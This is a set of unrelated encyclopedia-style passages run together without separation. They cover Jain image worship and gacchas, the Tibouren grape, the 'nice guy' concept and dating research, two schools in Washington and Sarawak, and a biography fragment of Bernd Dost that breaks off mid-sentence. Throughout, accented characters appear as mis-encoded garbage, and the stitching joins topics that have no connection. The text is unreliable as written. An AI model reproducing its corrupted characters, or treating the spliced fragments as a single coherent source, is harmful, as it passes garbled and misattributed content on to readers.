M≈´rtip≈´jaka Jains respond to the criticisms of m≈´rti-p≈´jƒÅ in two ways: first, by revealing that it is, in fact, scripturally prevalent; and second, by saying that images are necessary for the spiritual practices of laypeople. The monk ƒÄtmƒÅrƒÅm (1837 ‚Äì 1896), who was originally a ≈övetƒÅmbara SthƒÅnakavƒÅsƒ´ monk and later became the mendicant leader ƒÄcƒÅrya VijayƒÅnandas≈´ri, discovered upon reading early Jain texts in Prakrit and their Sanskrit commentaries that there was an abundance of references to image worship. This led him to believe that the non-M≈´rtip≈´jaka position actually \\"contravened Jain scripture\\". Muni Bhadra·πÖkaravijaya considered image worship as a means to cultivate morality by praising the qualities of the Tƒ´rtha·πÖkaras and undergoing the ascetic practices associated with them. As such, given its disciplinary nature, \\"image worship will actually destroy a wide variety of karmas.\\" Bhadra·πÖkaravijaya also argued that given the current cosmic age, it is not possible for laity to contemplate the Tƒ´rtha·πÖkaras without the assistance of some sort of mental prop or image. Thus, a key element of the M≈´rtip≈´jaka response to the controversy of image worship is to view the use of images as a tool to develop better spiritual practices, especially amongst the laity.  Other distinctions  Outside the use of images in worship, ≈övetƒÅmbara M≈´rtip≈´jaka Jains distinguish themselves in the use of the muhpattƒ´. The muhpattƒ´ is a small, rectangular piece of cloth placed over the mouth, traditionally used to prevent harming small organisms either by inhaling them or expelling breath onto them. M≈´rtip≈´jaka mendicants often wear this around their face by a string when they preach or read scriptures, or, according to Paul Dundas, they will simply hold it in place when necessary. In contrast, ≈övetƒÅmbara SthƒÅnakavƒÅsƒ´ and TerƒÅpanthƒ´ mendicants permanently wear the muhpattƒ´ except while eating. Laypeople will hold a similar cloth in front of their mouths during certain rituals, where it is intended to \\"prevent pollution of the sacred objects by [the laity's] breath.\\" However, Kristi Wiley notes that this is actually a different cloth from the muhpattƒ´. Gacchas Derived from the word for \\"tree\\" - or as Wiley also suggests, a derivation of the terms \\"going\\" or \\"traveling together\\" \\\\- ≈övetƒÅmbara M≈´rtip≈´jaka mendicants are divided into orders based on their pupillary lineages known as gacchas. Emerging between the 11th and 16th centuries, each of the gacchas claimed to represent a \\"truer\\" version of Jainism than another, and they often hotly contested one another in polemical debates and writings that argued against the laxity of mendicant regulations. Despite this, each of the gacchas shared a common ancestor, their respective records tracing back to the Tƒ´rtha·πÖkara MahƒÅvƒ´ra‚Äôs disciple, Sudharman. During the medieval period in India, M≈´rtip≈´jaka gacchas were numerous; however, in contemporary times, only a few major orders remain. According to Peter Fl√ºgel, there are six existent orders: * Kharatara Gaccha (1023 CE) * A(√±)cala Gaccha/Vidhi Pak·π£a (1156 CE) * ƒÄgamika/Tristuti Gaccha (1193 CE) * TapƒÅ Gaccha (1228 CE) * Vimala Gaccha (1495 CE) * PƒÅr≈õvacandra Gaccha (1515 CE) However, Balbir identifies only four larger M≈´rtip≈´jaka gacchas: * Kharatara Gaccha (simply traced to 11th century CE) * P≈´r·πáimƒÅ Gaccha (1093/1103 CE) * A√±cala Gaccha (dated at 1179 CE) * TapƒÅ Gaccha (1228 CE) Balbir notably includes the P≈´r·πáimƒÅ Gaccha in her list, as well as regulates the PƒÅr≈õvacandra, Vimala, and Tristuti Gaccha to the status of \\"minor\\" gacchas or \\"subsects.\\" Despite this, both Fl√ºgel and Balbir recognize the significance of the TapƒÅ Gaccha, which is the largest of the ≈övetƒÅmbara M≈´rtip≈´jaka orders. As previously mentioned, the Upake≈õa Gaccha is also identified as a ≈övetƒÅmbara sect, which according to Dundas, eventually died out during the end of the medieval era. Unlike the orders listed above, they claim descent from the 23rd Tƒ´rtha·πÖkara PƒÅr≈õvanƒÅtha. According to Fl√ºgel, some Upake≈õa Gaccha scholars like Devagupta S≈´ri considered \\"injury to living beings committed during the construction of temples and in the preparation of p≈´jƒÅ with flowers, fruits and water as a form of unavoidable or occupational violence (ƒÅrambhajƒÅ himsƒÅ).\\" In this sense, they are congruent with other M≈´rtip≈´jaka sects and their beliefs in that some forms of violence are permissible, or at least outweighed, by the value of temples and p≈´jƒÅ rituals.

Robinson Jancis Robinson's Guide to Wine Grapes pg 22 Oxford University Press 1996 While the unique aroma and character of the wines produced by Tibouren are valued by producers, it is not a widely planted variety. This is due, in part, to the viticultural issues of the grape's sensitivity to coulure and tendency to produce highly irregular yields from vintage to vintage. The wines produced from Rossese are a local specialty found around Dolceacqua. J. Robinson Jancis Robinson's Wine Course Third Edition pg 149 Abbeville Press 2003 History Location of Marseille and Saint-Tropez (underlined), where Tibouren may have been introduced to the Provence region While Tibouren today is almost exclusively associated with the Provence wine region, French ampelographer Pierre Galet suspects that the grape probably has Greek origins or possibly Middle Eastern. Galet's theory derives from the uniquely shaped leaves of the Tibouren vine, which include deeply incised lobes that are usually seen in Vitis families of the Middle East. He speculates that over the evolution of the grape its ancestor vines were brought to Greece and from there it was probably introduced to France by the Ancient Greeks at their settlement in Marseille. One competing theory is that the variety was a relatively recent import to Provence that was introduced to Saint-Tropez, to the east of Marseille, in the 18th century by a naval sea captain named Antiboul (from which several synonyms of Tibouren are derived). Wine regions Tibouren is a permitted grape variety in several Appellation d'Origine Contr√¥l√©e (AOC) wine regions of Provence, most notably the large C√¥tes de Provence AOC, which accounts for more than 75% of all Provence wine. The AOC runs non-contiguously from Nice west to Marseille and is the source of many ros√© wines. Here Tibouren, like all grape varieties in the AOC, is limited to a maximum yield of 55 hectoliters per hectare with the finish wine needing to attain a minimum alcohol level of 11%. While it is primarily used for ros√©s it can also be included in red wine blends. Tibouren is often blended with, for both reds and ros√©s, Grenache, Syrah, Cinsault, Mourvedre, Carignan and Cabernet Sauvignon. P. Saunders Wine Label Language pg 66-67 Firefly Books 2004 Viticulture and winemaking Tibouren is most often used in ros√© blends. Tibouren can be a difficult grape to cultivate due to the irregularly of the harvest yields it produces, often brought on by its sensitivity to coulure. This is one reason why Tibouren is often used as a blending grape rather than as a varietal wine. In blends, particularly the ros√©s of Provence, Tibouren contributes earthy aroma notes that are often described as garrigue. Synonyms Over the years, Tibouren and its wines have been known under a variety of synonyms including Antibois, Antiboulen, Antiboul√®ne, Antibouren, Antibourin, Gaysserin, Geysserin, Gueipperim noir, Guesserin, Rosese, Rosese Nero, Rosseis, Rossese, Rossese di Dolceacqua, Rossese di Ventimiglia, Rossese Nericcio, Rossese Nero, Rossese Rossa, Sarreiron, Tiboulen, Tiboulin, Tibouren noir, Tibourin and Tibourin noir.Tibouren, Vitis International Variety Catalogue, Accessed: February 21, 2011 Clones and other varieties According to the Vitis International Variety Catalogue, a few clonal variants of Tibouren exist that are distinct from the main dark-skinned noir variety.

In the literal sense, the term describes a man who is agreeable, gentle, compassionate, sensitive and vulnerable. The term is used both positively and negatively. When used positively, and particularly when used as a preference or description by someone else, it is intended to imply a male who puts the needs of others before his own, avoids confrontations, does favors, gives emotional support, tries to stay out of trouble, and generally acts nicely towards others.Glover, Dr. Robert, http://nomoremrniceguy.com In the context of a relationship, it may also refer to traits of honesty, loyalty, romanticism, courtesy, and respect. When used negatively, a nice guy implies a male who is unassertive or otherwise non-masculine. The opposite of a genuine \\"nice guy\\" is commonly described as a \\"jerk\\", a term for a mean, selfish and uncaring person. However, the term is also often used sarcastically, particularly in the context of dating, to describe someone who believes himself to possess genuine \\"nice guy\\" characteristics, even though he actually may not, and who uses acts of friendship and basic social etiquette with the unstated aim of progressing to a romantic or sexual relationship. Research on female preferences The results of the research on romantic perception of \\"nice guys\\" are mixed and often inconsistent. Herold & Milhausen conclude: \\"The answer to the question 'Do nice guys finish last?' is complicated in that it is influenced both by the measurement instruments used and by subject characteristics.\\"Herold and Milhausen, 1998 Studies that explicitly use the term \\"nice guy\\" sometimes cite research that does not directly use the term, but which addresses behaviours which are often associated with disingenuous \\"niceness\\". The \\"nice guy\\" construct One difficulty in studying the \\"nice guy\\" phenomenon is due to the ambiguity of the \\"nice guy\\" construct. Participants in studies interpret \\"nice guy\\" to mean different things. In their qualitative analysis, Herold and Milhausen found that women associate different qualities with the \\"nice guy\\" label: \\"Some women offered flattering interpretations of the 'nice guy', characterizing him as committed, caring, and respectful of women. Some women, however, emphasized more negative aspects, considering the 'nice guy' to be boring, lacking confidence, and unattractive.\\" The \\"jerks\\" were also divided into two categories, \\"as either confident, attractive, sexy, and exciting or as manipulative, unfaithful, disrespectful of women, and interested only in sex.\\" Nice guys are sometimes suggested to be overbearing or lacking in vision and ambitions; these opinions suggest self-confidence as a key point and area of improvement. Researchers have therefore operationalized the \\"nice guy\\" and \\"jerk\\" constructs in different ways, some of which are outlined below. Results of research Various studies explicitly try to elucidate the success, or lack thereof, of \\"nice guys\\" with women. Jensen-Campbell et al. (1995) operationalized \\"niceness\\" as prosocial behavior, which included agreeableness and altruism. They found that female attraction was a result of an interaction of both dominance and prosocial tendency. They suggest that altruism may be attractive to women when it is perceived as a form of agentic behavior. Nice guys are usually seen as twice more attractive than men who prefer to present themselves as neutral, and eight times more attractive than the \\"jerks\\" in a dating profile. Social dominance enhances female attraction to a male who has shown in the relationship niceness, traits of kindness and warmth stated by women looking for long-term relationships, and less status and physical attractiveness. Sprecher and Regan (2002) found kindness and warmth, expressiveness, openness and humor, as desirable traits of a long-term partner, less so social status indicators like future earning potential (wealth). Participants suggested they wanted more humor, expressiveness and warmth from their partner than is expressed with their friends. Herold and Milhausen (1998) asked a sample of undergraduate women \\"You meet two men. One, John, is nice but somewhat shy. He has not had any sexual experience. The other, Mike, is attractive, a lot of fun, and has had intercourse with ten women. Both wish to date you. Whom do you choose?\\" 54% reported a preference for \\"John\\", 18% preferred \\"Mike\\", and the rest had no preference. Urbaniak and Killman (2003) constructed vignettes of four hypothetical dating show contestants: \\"Nice Todd\\" vs. \\"Neutral Todd\\" vs. \\"Jerk Todd\\" vs. \\"Michael\\", who was created to be a control. \\"Nice Todd\\" described a \\"real man\\" as \\"in touch with his feelings\\", kind and attentive, non-macho, and interested in putting his partner's pleasure first. \\"Neutral Todd\\" described a \\"real man\\" as someone who \\"knows what he wants and knows how to get it\\", and who is good to the woman he loves. \\"Jerk Todd\\" described a \\"real man\\" as someone who \\"knows what he wants and knows how to get it\\", who keeps everyone else on their toes, and avoids \\"touch-feely\\" stuff. \\"Michael\\" described a \\"real man\\" as relaxed and positive. In two studies, Urbaniak and Kilmann found that women claimed to prefer \\"Nice Todd\\" over \\"Neutral Todd\\" and \\"Jerk Todd\\", relative to \\"Michael\\" even at differing levels of physical attractiveness. They also found that for purely sexual relationships, \\"niceness appeared relatively less influential than physical attractiveness.\\" After acknowledging that women's preference for \\"niceness\\" could be inflated by the social desirability bias, especially due to their use of verbal scripts, they conclude that \\"our overall results did not favor the nice guy stereotype.\\" McDaniel (2005) constructed vignettes of dates with a stereotypical \\"nice guy\\" vs. a stereotypical \\"fun/sexy guy\\", and attempted to make them both sound positive. Participants reported a greater likelihood of wanting a second date with the \\"nice guy\\" rather than with the \\"fun/sexy guy\\". A 2008 study at New Mexico State University in Las Cruces showed, that \\"nice guys\\" report to have significantly fewer sexual partners than \\"bad boys\\". Barclay (2010) found, that when all other factors are held constant, guys who perform generous acts are rated as being more desirable for dates and long-term relationships than non-generous guys. This study used a series of matched descriptions where each male was presented in a generous or a control version which differed only whether the man tended to help others. The author suggests that niceness itself is desirable to women, but tends to be used by men who are less attractive in other domains, and this is what creates the appearance of \\"nice guys finish last\\". Judge et al (2011) concluded, that \\"Nice guys do not necessarily finish last, but they do finish a distant second in terms of earnings ... yet, seen from the perspective of gender equity, even the nice guys seem to be making out quite well relative to either agreeable or disagreeable women\\". Judge, Timothy A.; Livingston, Beth A.; Hurst, Charlice, \\"Do nice guys‚Äîand gals‚Äîreally finish last? The joint effects of sex and agreeableness on income\\", Journal of Personality and Social Psychology, 28 November 2011 (abstract full text ) These studies also cite other research on heterosexual attraction that does not mention the \\"nice guy\\" term. They interpret various studies on female attraction to various traits in men (e.g., dominance, agreeableness, physical attractiveness, wealth, etc.) and on the sexual success of men with different personality traits, to shed light on the \\"nice guy\\" phenomenon. Sadalla, Kenrick, and Vershure (1985) found, that women were sexually attracted to dominance in men (though dominance did not make men likable to women), and that dominance in women had no effect on men. Bogaert and Fisher (1995) studied the relationships between the personalities of university men and their number of sexual partners. They found a correlation between a man's number of sexual partners, and the traits of sensation-seeking, hypermasculinity, physical attractiveness, and testosterone levels. They also discovered a correlation between maximum monthly number of partners, and the traits of dominance and psychoticism. Bogaert and Fisher suggest that an underlying construct labelled \\"disinhibition\\" could be used to explain most of these differences. They suggest that disinhibition would correlate negatively with \\"agreeableness\\" and \\"conscientiousness\\" from the Big Five personality model. Botwin, Buss and Shackelford (1997) found that women had a higher preference for surgency and dominance in their mates than men did, in a study of dating couples and newlyweds. Other viewpoints A number of viewpoints have arisen in popular culture that revolve around the concept of the \\"nice guy\\", irrespective of the preceding research. The \\"nice guys finish last\\" view A common aphorism is that \\"nice guys finish last.\\" The phrase is based on a quote by Brooklyn Dodgers manager Leo Durocher in 1946, which was then condensed by journalists.The Yale Book of Quotations, Fred R. Shapiro, Yale University Press, 2006, p. 221 The original quote by Durocher, referring to the Dodgers' bitter rivals, the New York Giants, was, \\"The nice guys are all over there, in seventh place.\\" (1946 July 6),N.Y. Journal American, 1946 July 7 about the 1946 New York Giants ‚Äì seventh place was actually second-to-last place in the National League; many variants appear in later works, including Durocher's autobiography, Nice Guys Finish Last.Nice Guys Finish Last, by Leo Durocher, with Ed Linn, Simon & Schuster, 1975, renders it as \\"Take a look at them. All nice guys. They‚Äôll finish last. Nice guys ‚Äì finish last.\\" The Giants would finish the 1946 season in the National League cellar, while Durocher's Dodgers would end up in second place. Though this is the origin of the phrase, Durocher's remark was specific to the context of baseball, and indeed to the context of that set of players, rather than intended as generally applicable to male/female relationship dynamics or in any other context and his allegation of a cause-and-effect relationship between being nice and finishing last was at most merely implicit ‚Äì it can also be interpreted as \\"Nice guys, but they will finish last\\", rather than \\"all nice guys finish last\\". Simplistically, the term \\"nice guy\\" could be an adjectival phrase describing what appears to be a friendly, kind, or courteous man. The \\"nice guys finish last\\" phrase is also said to be coined by American biologist Garrett Hardin to sum up the selfish gene theory of life and evolution. This was disputed by Richard Dawkins, who wrote the book The Selfish Gene. Dawkins was misinterpreted by many as confirming the \\"nice guy finishing last\\" view, but refuted the claims in the BBC documentary Nice Guys Finish First. The \\"nice guys finish last\\" view is that there is a discrepancy between women's stated preferences and their actual choices in men. In other words, women say that they want nice guys, but really go for men who are \\"jerks\\" or \\"bad boys\\" in the end. Stephan Desrochers claims, in a 1995 article in the journal Sex Roles, that many \\"sensitive\\" men, based on personal experience, do not believe women actually want \\"nice guys\\". According to McDaniel, popular culture and dating advice: \\"...suggest that women claim they want a 'nice guy' because they believe that is what is expected of them when, in reality, they want the so-called 'challenge' that comes with dating a not-so-nice guy.\\" Urbaniak & Kilmann write that: Another perspective is that women do want \\"nice guys,\\" at least when they are looking for a romantic relationship. Desrochers (1995) suggests that \\"it still seems popular to believe that women in contemporary America prefer men who are 'sensitive,' or have feminine personality traits.\\" Women have differing opinions about whether \\"nice guys finish last\\" sexually or not. Herold and Milhausen found that 56% of 165 university women claimed to agree with the statement: \\"You may have heard the expression, 'Nice guys finish last.' In terms of dating, and sex, do you think women are less likely to have sex with men who are 'nice' than men who are 'not nice'?\\" A third view is that while \\"nice guys\\" may not be as successful at attracting women sexually, they may be sought after by women looking for long-term romantic relationships (however, \\"nice guys need not lose all hope, with studies showing that while women like 'bad boys' for flings, they tend to settle down with more caring types\\" ‚Äì the \\"bad boys\\" tending to exhibit the dark triad, i.e., \\"the self-obsession of narcissism, the impulsive, thrill-seeking and callous behaviour of the psychopath and the deceitful and exploitative nature of Machiavellianism\\". It is a possibility that women leave to escape their circumstances of abuse, disease or pregnancy to seek a chance with the nice guy (they rejected previously), afterwards. Herold and Milhausen claim: \\"While 'nice guys' may not be competitive in terms of numbers of sexual partners, they tend to be more successful with respect to longer-term, committed relationships.\\" Another study indicates that \\"for brief affairs, women tend to prefer a dominating, powerful and promiscuous man.\\" Further evidence appears in a 2005 study in Prague: \\"Since women can always get a man for a one-night stand, they gain an advantage if they find partners for child-rearing.\\" \\"Nice Guy\\" syndrome The terms \\"Nice Guy\\" and \\"nice guy syndrome\\" can be used sarcastically to describe a man who views himself as a prototypical \\"nice guy,\\" but whose \\"nice deeds\\" are deemed to be solely motivated by a desire to court women. From said courting, the 'nice guy' may hope to form a romantic relationship or may be motivated by a simple desire to increase his sexual activity. The results of failure are often resentment toward women and/or society. The 'nice guy' is commonly said to be put by women \\"into the friend zone\\" who do not reciprocate his romantic or sexual interest. Third wave feminist interpretations tend to see this resentment as being based upon an assumption by men that they are entitled to sex and are therefore confused when they find that it is not forthcoming despite their supposed 'niceness'. More male orientated interpretations claim that the resentment is down to the fact that society, and the vast majority of people in spoken conversation, claim to be attracted to traits such as honesty, integrity and kindness, when in reality more superficial considerations trigger attraction. According to this interpretation people who display wealth, good looks, dominance and confidence tend to succeed more in romance than do 'nice guys'. Nice guys are therefore resentful at the inconsistency between what people claim to be attracted to and by how they act in reality. In early 2002, the web site Heartless Bitches International (HBI) published several \\"rants\\" on the concept of the Nice Guy. The central theme was that a genuinely nice male is desirable, but that many Nice Guys are insecure men unwilling to articulate their romantic or sexual feelings directly. Instead, they choose to present themselves as their paramour's friend, and hang around, doing nice things for her in hopes that she will pick up on their desire for her. If she fails to read their secret feelings, Nice Guys become embittered and blame her for taking advantage of them and their niceness. The site is particularly critical of what they see as hypocrisy and manipulation on the part of self-professed Nice Guys. According to journalist Paris Martineau, the incel and red pill movements (part of the anti-feminist manosphere) recruit depressed, frustrated men ‚Äì who may suffer from \\"Nice Guy syndrome\\" ‚Äì into the alt-right.

The school opened in September 1979. The school enrolls 1611 students (2017) in ninth through twelfth grades.  Facility history and remodel  Gig Harbor High School (GHHS) opened its doors in the fall of 1979 as the second high school in the Peninsula School District. The first graduating class was in 1981. In an effort not to split up the senior class from cross-town Peninsula High School during the first year of operation, GHHS enrolled grades 8-11 during the inaugural 1979-1980 school year. As a result, the graduating class 1984 had the distinction to attend the school for five years. The initial design concept of GHHS was based on the co- teaching model in which the classrooms offered flexibility to expand or sub- divide their spaces to accommodate large or small class groups. In 1990, the school was renovated with a 120,000-square-foot, three-phase addition and remodel while occupied. Phase 1 consisted of a new Masonry classroom building, gymnasium, and a new science addition. Phase 2 was the complete renovation of existing space, including upgrading portions of the food service area and a new administration area. Phase 3 consisted of renovation of the old, remaining administration area into classrooms and a music area.WPC  Athletics and activities  Tide Guy (school mascot) Speech & Debate Team The speech and debate team attends both state and national tournaments yearly.

This raised the question as to whether the employment of security cameras to monitor public displays of affection is a valid use of school resources, and whether or not reporting it to their parents was a violation of their rights. After an internal investigation the Peninsula School District concluded it would now only use security cameras for monitoring activities such as trespassing, bullying, and vandalism, and that school employees will now be barred from sharing security tapes with parents. Keith Nelson later commented in an interview defending his actions stating \\"They're paying good money for us to make their kids good citizens.

The school is a national secondary school, a government school in which Malay is the main medium of instruction.  History  Datu Patinggi Abang Haji Abdillah College was officially opened on 29 September 1978 by the third Prime Minister of Malaysia, Tun Hussein Onn. Dubbed the 'Eton of Borneo', the college was formerly known as Datu Patinggi Abang Haji Abdillah Junior Science College. Its original purpose was to serve as a Junior College for Form 6 students who obtained good results in their Form 5 examination. In later years, the college started admitting Form 1 to Form 5 students while still keeping the Kolej (College) prefix. Admission for Form 6 students was halted in 2005. Tun Hussein Onn at the school's opening ceremony. The plan to build the school was granted by the Federal Government in 1972 under the Second Malaysia Plan (RMK-2). The construction was completed in 1978, covering 8 hectares. The college was named after Datu Patinggi Abang Haji Abdillah, a local politician who served under Vyner Brooke. He was a well known patriot who opposed the cession of Sarawak to the British Crown in 1946.  Admission  Admission to the school is monitored and conducted by the State Education Board. Since 2017, after the implementation of both KSSM and KSSR programmes under the KPM, there are no specific minimum requirements to enter the school, instead a student (Form 1) whom applied the admission to this school, with good results in UPSR will be called for an interview.

The second anthem, Arif dan Maju (written by Wan Danial Samiun Bin Wan Mohamad), was introduced during Putit bin Haji Ped's tenure as the Principal when the college was declared a Smart School. However, Pelajar Bestari was replaced by Hearts and Minds during Mdm. Johara Zen's administration in 2007. In 2005, during Datin Halimah's administration, We Must, We Can, We Will Excel was adopted as the college slogan. A popular short phrase was then added to the slogan by Tuan Haji Ibrahim bin Haji Jamain, \\"We Must, We Can, We Will Excel, Eureka Yes!\\", which now the slogan is the battle cry for the whole Kolej community.  Sports Houses  Kolej DPAH Abdillah has four 'houses', each assigned with a particular color (in brackets); Lions (Red), Wallabies (Orange), All Blacks (Black) and Springboks (Green). The houses are named after international rugby teams. Prior to 2001, the names used were either based on the name of local heroes or patriots; Rentap, Sharif Masahor, Rosli Dhobi and Patinggi Ali (Patali). In 2001, the names of Proton (National) cars were used, namely Waja (Red), Satria (Yellow), Perdana (Blue) and Wira (Green). In 2009, the houses names were changed to the names of four famous Rugby teams from around the world; Lions, Springboks, Wallabies and All Blacks. Students are assigned to a randomly selected house. Houses compete against each other in the Annual Sports Event and academic competitions like debates. School publications The SPEKTRA is the school's official yearbook or annual magazine and is also the longest running school publication. The editorial board consists of students and teachers. However, the main body of the editorial board consists of students. In 2015, SPEKTRA publication was taken over by Kolej DPAH Abdillah Multimedia Club after responsible publisher, which was Mr. Mohd Noor bin Lamat moved out from Kolej to his new school. Buletin Bestari is the school's official newsletter, published by the Briged Bestari of Kolej Abdillah. It is unclear as to when Briged Bestari started its publication, but it has been said that it was first published since the school opened. For unknown reasons the school stopped publishing Buletin Bestari in the 1990s. The Media and Computer Club published their own newsletter, Owl's in 2004, in an attempt to start a new official newsletter. In 2005, the extra curricular adviser changed the name and structure of the Media and Computer Club to Briged Bestari, which in result replaced Owl's with the reborn Buletin Bestari. The Buletin Bestari was republished in the same year. Other publications include newsletters published by the school's own Young Entrepreneurs Program (YEP) companies, such as the From the Eyes of Collegians newsletter. G News is the production of news by the school and started since 2011. It is shown during the assembly to all the students in the school. G News reports on current issues surrounding the school and the achievements of students in extracurricular or curricular activities. It's now currently had stopped publishing since there is no video editor in the school. Extracurricular achievements The school has been competitive in the Young Entrepreneurs Program, and it won several national awards in 2002 and 2005, defeating other schools in Malaysia, two of which are MCKK and Victoria Institution. Debate and public speaking Kolej DPAH Abdillah produced great orators in 1980, winning the Chief Minister's Cup Malay Debate Championship. The person in-charge of the Bahasa Malaysia debate team, (Cikgu Bhaludin Salleh) has resigned and opened a well known tuition centre named Pusat Bimbingan Karya. It was the year 2006 when Kolej DPAH Abdillah won the Sarawak Bahasa Melayu Parliamentary Style Debate. Under the guidance of Cikgu Zaidi and Cikgu Maimunah, the team placed second in the National (Borneo) Bahasa Melayu Parliamentary Style Debate which was held in Labuan. In 2005, Kolej DPAH Abdillah won the State-level Royal Cup Speech Competition and its representative, Junnyaruin Barat was selected to represent Sarawak in national-level competition. In 2008, the English Debate team under the guidance of Madam Maria Tan trained with the Debate Team of UiTM Sarawak. UiTM Sarawak was the Borneo Cup Debating Tournament champion for 2006 and 2008, as well as one of the finalists in the Vice-Chancellor Cup Debating Championship in 2007 which was held in Shah Alam. The Kolej Abdillah-UiTM collaboration was funded by the Parents-Teachers Association. The representatives for the year's English Debate was Nalisha Laila [first speaker], Nor Shafiqah [second speaker], Aliff Farhan [third speaker] and Ajibah [reserve]. In 2013, the English Debate team won the Inter-School English Parliamentary Style Debate Competition, Divisional Level. The competition was hosted by SMK Bau. The team then placed 2nd-runner-up in the State level competition held in Limbang. In the same year, the debate team consisting of Joshua Chew [first speaker], Nor Atikah [second speaker] and Azeem Abadi [third speaker] emerged as champions in the Kenyalang Debate Muda Tournament organised by UiTM, Kota Samarahan. Azeem Abadi was awarded the Best Debater in the finals while Joshua Chew was awarded Third Best Speaker of the tournament. Kolej DPAH Abdillah's English Debate team was also the Champion for the National ICT Security Debate : CyberSAFE Challenge Trophy Sarawak Zone. The team represented Sarawak at the National level, making it to 3rd place. In 2014, the debate team consisting of Joshua Chew [first speaker], Muhammad Rahiman [second speaker] and Azeem Abadi [third speaker] were finalists of the Asian Parliamentary Inter School Debate Competition in Curtin University, Miri. Joshua Chew was awarded the Best Speaker of the final round. Two other students, Nor Atikah and Siti Nurfatihah, participated in the Oratory Competition, which was held concurrently with the debate competition in Curtin University, Miri. Nor Atikah emerged as the champion and Siti Nurfatihah was the 2nd runner up. Earlier in the year, Kolej Abdillah had several teams participating in the Swinburne Sarawak Inter School Debate Championship held in Swinburne University, Kuching. In the Senior category, Team A composed of Joshua Chew, Nor Atikah and Azeem Abadi, qualified for the breaking rounds, breaking 8th, and were quarter finalists of the tournament. Debaters of Kolej Abdillah also participated in open tournaments, such as the Borneo British Parliamentary Debate Competition, held in UNIMAS, Kota Samarahan. Team A were quarter finalists of the tournament. In 2015, an official Oratory Club was founded. In 2020, the debate team consisting of Muhammad Abdul Aziz [first speaker], Ameera Nailya [second speaker] and Eddry Haqimy [third speaker] achieved a notable milestone when they became the first collegian debate team to break into the semi-finals of the prestigious Swinburne Sarawak Inter-School Debating Championship (SSIDC), senior category. Two years prior, Muhammad Abdul Aziz and Eddry Haqimy, along with Dayang Azizah as the third speaker paved the way for collegian debate teams by becoming the forerunner among collegian debaters to break further than quarter-finals as juniors. Currently, this is the most notable and accomplished achievements a debate team from the school has ever held, due to the sheer size and competition of SSIDC. Young Entrepreneurs Programme The Young Entrepreneurs Programme (YEP) of Kolej DPAH Abdillah is probably the most acclaimed club in Kolej Abdillah. It has represented the state of Sarawak several times. List of YEP companies * 2002: College Hillz Sdn. Bhd. * 2003: Abdillahz Empire Sdn. Bhd. * 2004: Enigma 42 Sdn. Bhd * 2006: F.L.A.M.E. Sdn.

As of 2005, the Kolej Abdillah has two taekwondo clubs: the International Taekwon-Do Federation (ITF) and World Taekwondo Federation (WTF). Both taekwondo clubs would collaborate with the school's other martial arts clubs to do martial arts performances on annual sporting events. Rugby Rugby was first introduced to the school in 1997. The rugby team was supervised by Cikgu Zulkarnain and trained by Coach Pat, who led the team to victory in the Kuching Division tournament in the same year. After the sole victory, it was rumoured that the players began spending more time in their studies, which resulted in the club's demise in 1999. However, according to trusted sources, the club's downfall was the result of Coach Pat leaving the team to further his studies and leaving no successor to head the team. The school's rugby team, now known as the 'College Titans', was re-established in 2003 and its players were trained by a rugby player and Form 6 student Azfar Zubri, who once captained the Malaysian U-19 rugby team. The College Titans became stronger each year and this in return sparked the other students' interest in the sport. Some of the Titans' players were even selected to play for the Kuching division and state teams. The College Titans is now one of the big names in secondary school rugby, along with the competitive team from the SHOAW rugby team. The School now has a better team called Sharks. The team is divided into 3 sections, which are u-14,u-15, and u-18. Every tournament, the Sharks will always do their best to win. The Sharks never seek for winning because they only wanted to play for fun. The teacher that is currently leading the rugby team is Mr. Zamzy Abdul Rahman. Dance Kolej DPAH Abdillah once had a competitive dance group which had won several competitions and was described as one of the best dance teams in Kuching. The group was officially started in 1997 and it took part in the Dance Competition organised by the Sarawak Cultural Village in the same year. For its first appearance in the competition, the group was given the \\"Kumpulan Harapan\\" title and brought home \\"Piala Harapan\\", which was quite a confidence boost for them as newcomers. The group then immediately became a favourite and received good critics from the judges of the competition. Since then, there were many invitations for the group to perform in big events around Kuching. In the same year, they won a dance competition organised by the Kuching North City Hall (DBKU) on the Kuching City Day (first place for school category - cultural performance). This achievement led the group to practice harder the next year and it was paid off when the group took first place in the Sarawak Cultural Village School dance competition. They also won DBKU's Dance Competition in the same year. In 1999, the senior dancers graduated from school and that left the new dancers struggling to keep their reign as a champions but it proved to be a challenging year for the fresh faces. The newly recruited dancers only managed to take the second or third place in most of the competitions they took part in. In 2000, the group once again recruited new dancers. However, due to problems such as instructor replacements and irregular schedule changes, the group was not able to perform at their best and failed to bag any prizes in any competitions. It was a total meltdown for them but the Kolej DPAH Abdillah Dance Group (now also known as the Kassorga Dancers) had the best dancers in their time. Kolej DPAH Abdillah Dance Group was labelled a 'one hit wonder team' then.  Traditions  * Students addressed their principal as 'Ayahanda' (Malay for father) or 'Bonda' (Malay for mother). A slight variation was made for Madam Johara Zen, who is referred to as 'Ummi', which translates to mother in Arabic. * Prior to 2004, the school anthem was played by a student on a piano in every assembly. However, the tradition stopped in 2004. An attempt to revive the tradition by Datin Hajah Halimah was met with failure. * Madam Johara Zen changed the names for the classes to the names of precious minerals; Indigo (Indigo) to Amethyst, Merah (Red) to Ruby, Biru (Blue) to Sapphire, Kuning (Yellow) to Topaz, Hijau (Green) to Emerald, Putih (White) to Diamond and Jingga (Orange) to Amber (the class does not exist anymore now) in 2007.  The Pelajar Bestari song was replaced with the government-created song; Hearts and Minds by Madam Johara Zen. * Prior to the principal Haji Ibrahim period, a battle cry, \\"We Must, We Can, We Will Excel, Eureka Yes\\", was adopted and will be chanted every time the principal finishes his speech.

He produced documentaries for ARD, Germany‚Äôs leading Public TV Station, and wrote articles for the magazine Stern and the newspapers M√ºnchner Merkur and M√ºnchner Abendzeitung. His documentary works are socio-critical and deal with major topics such as environmental protection, human rights and psychology. As a documentary film maker, Bernd Dost has worked with various people like Jane Goodall, the Anti-psychiatry pioneer Ronald David Laing or the writer Carl Amery. His novels include elements of surrealism, transgressional fiction and postmodernism and deal with mass media, religion and psychology. He was the brother of theater and film actress Roswitha Dost. Biography and work Youth Dost was born in Dortmund. His father, Josef Dost, was a foreman, and his mother, Elisabeth \\"Elli\\" Dost, a writer. During the Second World War Bernd Dost experienced the bombing of Dortmund, was subsequently evacuated and grew up in Hemer in the Sauerland. From a very early age he was interested in a career as a writer and journalist. He graduated from secondary school in 1957 in Iserlohn, then studied both German and English languages and literature as well as psychology in Marburg and Munich. He worked his way through university, performing a wide assortment of jobs. For example, as a trainee, he worked for the Westf√§lische Rundschau in Iserlohn and in his Munich days was involved in the student magazine Profil. He was also hired intermittently by the Insel Film company as an Assistant Script Editor. Journalism Bernd Dost elected to be self- employed early 